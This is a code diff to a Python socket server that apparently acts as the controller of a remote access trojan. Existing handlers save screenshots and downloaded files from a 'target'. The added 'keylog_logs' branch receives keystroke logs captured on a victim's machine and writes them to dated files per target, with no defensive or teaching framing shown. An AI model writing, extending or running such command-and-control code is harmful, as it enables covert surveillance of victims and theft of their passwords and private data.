@@ -1,6 +1,7 @@
 import socket
 import json
 import threading
+import datetime
 
 
 class Server:
@@ -70,6 +71,14 @@ class Server:
                     self.write_file(f'screenshot{self.number}.png', file_data)
                     self.number += 1
                     print('screenshot saved')
+
+                elif command[0] == 'keylog_logs':
+                    data = self.receive_data(target)
+                    name = f'{target} - {datetime.date.today()}.txt'
+
+                    with open(name, 'w') as f:
+                        f.write(data)
+                    print(f'Logs from {target} has been saved')
 
                 elif command[0] == 'download':
                     file_data = self.receive_data(target)
